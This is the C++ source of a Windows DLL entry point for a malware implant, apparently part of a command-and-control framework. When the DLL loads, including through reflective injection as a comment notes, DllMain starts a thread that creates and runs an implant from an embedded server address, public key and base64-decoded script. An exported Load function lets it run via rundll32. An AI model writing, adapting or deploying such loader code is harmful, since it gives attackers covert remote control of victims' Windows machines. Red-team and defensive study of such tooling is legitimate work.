//#include <SDKDDKVer.h>
#define WIN32_LEAN_AND_MEAN
#include <windows.h>

#include "implant.h"
#include "patch.h"

// Holds the global variables for our thread
HANDLE hThread;
DWORD threadID;
HMODULE base_address;

// Function executed when the thread starts
DWORD WINAPI Start(LPVOID lpParam) {
  std::string_view callback_package {script};
  implant i(server, server_public_key, util::base64::decode(script));
  i.run();
  return TRUE;
}

// Executed when the DLL is loaded (traditionally or through reflective injection)
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
  switch (ul_reason_for_call)
  {
    case DLL_PROCESS_ATTACH:
      DisableThreadLibraryCalls(hModule);
      base_address = hModule;
      hThread = CreateThread(NULL, 0, Start, NULL, 0, &threadID);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
      break;
  }
  return TRUE;
}

// This is so the DLL can be started with rundll and still function properly
// It will wait for the thread to finish (i.e. implant exiting)
extern "C" __declspec(dllexport) BOOL Load(LPVOID lpUserdata, DWORD nUserdataLen)
{
  if (hThread) {
    WaitForSingleObject(hThread, INFINITE);
  }
  return TRUE;
};
